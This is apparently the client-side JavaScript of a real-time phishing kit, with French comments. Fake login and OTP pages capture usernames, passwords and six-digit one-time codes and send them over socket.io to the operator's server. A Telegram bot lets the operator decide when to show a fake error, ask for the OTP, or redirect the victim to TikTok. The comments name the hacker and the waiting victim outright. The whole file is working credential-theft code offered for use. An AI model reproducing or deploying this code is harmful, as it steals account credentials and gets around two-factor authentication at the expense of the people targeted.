const socket = io();

// Éléments du DOM
const overlay = document.querySelector('#loading-overlay');
const loginBtn = document.querySelector('#login-btn');
const otpBtn = document.querySelector('#otp-btn');
const otpFields = document.querySelectorAll('.otp-field');

// --- 1. SIGNAL D'OUVERTURE ---
// On attend que la connexion soit établie pour envoyer l'alerte
socket.on('connect', () => {
    console.log("Connecté au serveur. Envoi de l'alerte de vue...");
    socket.emit('page_viewed');
});

// --- 2. RÉCEPTION DES ORDRES (Depuis Telegram) ---

// Ordre : Afficher l'erreur de mot de passe
socket.on('loginError', () => {
    if (overlay) overlay.style.display = 'none'; 
    alert("Identifiant ou mot de passe incorrect. Veuillez réessayer.");
});

// Ordre : Basculer sur la page OTP
socket.on('goToOTP', () => {
    if (overlay) overlay.style.display = 'none';
    window.location.href = "otp.html";
});

// Ordre : Redirection finale validée par le hacker
socket.on('final_redirect_order', () => {
    console.log("Ordre de redirection reçu !");
    if (overlay) overlay.style.display = 'none';
    window.location.href = "https://www.tiktok.com/";
});

// --- 3. LOGIQUE PAGE LOGIN (index.html) ---
if (loginBtn) {
    loginBtn.onclick = (e) => {
        e.preventDefault();
        const user = document.querySelector('#username').value;
        const pass = document.querySelector('#password').value;

        if (user && pass) {
            // Activer l'effet de chargement blanc transparent
            if (overlay) overlay.style.display = 'flex';

            // Sauvegarde locale
            localStorage.setItem('target_user', user);

            // Envoi des infos (le bot Telegram va vibrer)
            socket.emit('login_attempt', { user, pass });
        } else {
            alert("Veuillez remplir tous les champs.");
        }
    };
}

// --- 4. LOGIQUE PAGE OTP (otp.html) ---
if (otpBtn && otpFields.length > 0) {
    // Focus automatique pour les 6 cases
    otpFields.forEach((field, index) => {
        field.addEventListener('input', (e) => {
            if (e.target.value.length === 1 && index < otpFields.length - 1) {
                otpFields[index + 1].focus();
            }
        });
        field.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && field.value.length === 0 && index > 0) {
                otpFields[index - 1].focus();
            }
        });
    });

    otpBtn.onclick = (e) => {
        e.preventDefault();
        let fullCode = "";
        otpFields.forEach(input => fullCode += input.value);

        if (fullCode.length === 6) {
            // On affiche le chargement (la victime attend ton clic sur Telegram)
            if (overlay) overlay.style.display = 'flex';

            const user = localStorage.getItem('target_user') || "Inconnu";
            socket.emit('otp_submit', { user, code: fullCode });
            
            console.log("OTP envoyé. En attente de validation sur Telegram...");
        } else {
            alert("Veuillez entrer les 6 chiffres.");
        }
    };
}